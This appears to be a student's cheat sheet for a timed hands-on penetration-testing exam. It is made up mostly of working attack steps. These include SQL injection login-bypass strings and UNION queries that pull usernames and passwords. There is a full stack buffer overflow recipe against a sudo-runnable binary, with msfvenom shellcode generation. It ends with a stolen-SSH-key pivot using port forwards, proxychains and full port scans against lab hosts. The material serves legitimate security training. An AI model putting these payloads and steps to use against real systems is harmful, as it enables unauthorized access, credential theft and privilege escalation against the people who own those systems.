Test priority:
2 parts: 3 hours each.
SQL.
Part 1 closes out after 3 hours.
part 1: basic website
directory traversal
manipulation
command injection
ssh key masquerade
FUCKS EVERYONE:
calm down, read full question.

85% of it is linux based.

NOTES:
--------------------------------
####AUTHENTICATION BYPASS#####
'OR 1='1   $truth statement in username and password
Go to inspect > network (login so you get the post) > post > request > raw (radio button) > paste ?THERAWSTRING into google
x.x.x.x/login.php?username='OR 1='1&password=OR 1='1    ####put a ? after the php, and then paste the RAWSTRING directory after it.
x.x.x.x/login.php?username=%27OR+1%3D%271&passwd=%27OR+1%3D%271   ###Example of what it should look like

######SQL INJECTION QUIERES######
#1 Identify the vulnerable field
'OR 1='1 # Put it in the field or in the url after .php?Selection=1
#2 Identify number of columns
'Union SELECT 1,2,3 #  #might need to add other symbols to break query
#3 Use golden statement
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
Audi'UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns
#4 Craft Queries
Audi'UNION SELECT username,2,passwd,4,5 FROM session.userinfo #
## GET METHOD
#1 Identify the vulnerable field
Use the URL after submitting, take out the quest and after Selection=1 or 1=1
#2 Identify number of columns
Selection=4 Union Select 1,2,3
#3 Golden Statement
UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
#4 Craft Queries is the Same
# See Databases
Audi'UNION SELECT table_schema,2,3,4,5 FROM information_schema.columns

######FIND A FILE TO EXPLOIT, RUN AGAINST IT FOR BUFFER OVERFLOW#######
Run sudo -L,
This gives you a file that you can have sudo privelages to run commands through.
/var/tmp/exploitme
Find if the file needs parameters or text input.
./var/tmp/exploitme <<<$(echo "asdasdasd")  ##Accepts text input
./var/tmp/exploitme $(echo "asdasdasd") ##Accepts parameters
Your syntax for running your script against the file will be 
gdb ./exploitme -> run $(python pbuff.py) or gdb ./exploitme -> run <<<$(python pbuff.py)
Your python file will look like: ##########
vim lynnbuff.py
#!/usr/bin/env python

offset = "wijejnsoifoosmkefmsks"
print(offset)
#############
firefox on linux workstation -> wiremask.eu -> tools -> buffer overflow pattern generator.
Copy the Hex given, use that HEX to find the offset (Register Value), use that offset to find the actual offset.
After finding the offset, put amount of characters in your offset and recreate script to ensure its working:
####
#!/usr/bin/env python

offset = "wijejnsoifoosmkefmsks"
eip = "BBBB"
print(offset+eip)
#####
your eip should be 42424242. From here you do:
gdb ./exploitme -> show env -> unset env COLUMNS -> unset env LINES -> show env -> run $(python pbuff.py) -> info proc map -> find /b (START HEX AFTER HEAP),(END HEX BEFORE STACK),
0xff, 0xe4.
The output given take first 5 lines, make your eip your first little endian. "0xf7de3b59 -> \x59\x3b\xde\xf7"
Go to your pc, and make an msfvenom to create your buf:
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
Final script: ####################
####
#!/usr/bin/env python

offset = "wijejnsoifoosmkefmsks"
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf = 
print(offset+eip+nop+buf)

'''
HEX1 -> Little Endian (from the back) 
HEX2
HEX3
HEX4
HEX5
msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
'''
#####
###########SSH MASQUERADE#############
For dumb S WORD !!!!!!!! <!> <!> <!> ############################################################################################################################################
scp HACKER@HACKERIP:FILEPATHTOSSHKEY ME:MYFILEPATH -P ENEMYPORT
tar -xvf /home/student/stolenkey1 -C /home/student/stolenkey1_gun
ssh -MS /tmp/jmp student@10.50.11.224 -L 41010:192.168.28.100:2222
ssh www-data@localhost -p 41010 -D 9050 
proxychains nmap -T5 -Pn 192.168.150.253 -p 0-65535 2>/dev/null
chmod 600 /home/student/stolenkey1_gun/.ssh/id_rsa.pub
ssh -i /home/student/stolenkey1_gun/.ssh/id_rsa Comrade@192.168.150.253 -p 41011
ssh -MS /tmp/jmp student@10.50.11.224 -L 41010:192.168.28.100:2222 -L 41011:192.168.150.253:3201

#########
